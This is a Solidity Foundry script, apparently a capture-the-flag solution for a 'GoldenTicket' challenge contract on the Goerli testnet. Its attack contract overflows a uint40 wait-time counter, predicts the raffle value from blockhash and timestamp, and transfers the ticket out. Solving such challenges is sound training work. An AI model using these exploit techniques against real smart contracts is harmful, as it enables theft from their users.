// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/ChallengeGoldenTicket.sol";

contract Hack {
    constructor(GoldenTicket ticket) {
        ticket.joinWaitlist();

        // calculate overflow
        uint40 time = ticket.waitlist(address(this));
        uint40 offset = type(uint40).max - time + 2;
        ticket.updateWaitTime(offset);

        uint256 guess = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        ticket.joinRaffle(guess);

        ticket.giftTicket(msg.sender);

        selfdestruct(payable(msg.sender));
    }
}

// https://goerli.etherscan.io/address/0x1EDa00a23Ab0DA3852BbbEd2b182cd3A0C5F98e2
contract ChallengeGoldenTicketScript is Script {
    address constant instance = 0x1EDa00a23Ab0DA3852BbbEd2b182cd3A0C5F98e2;

    function run() public {
        vm.startBroadcast();

        GoldenTicket ticket = GoldenTicket(instance);
        new Hack(ticket);

        console.log("hasTicket?", ticket.hasTicket(msg.sender));
    }
}
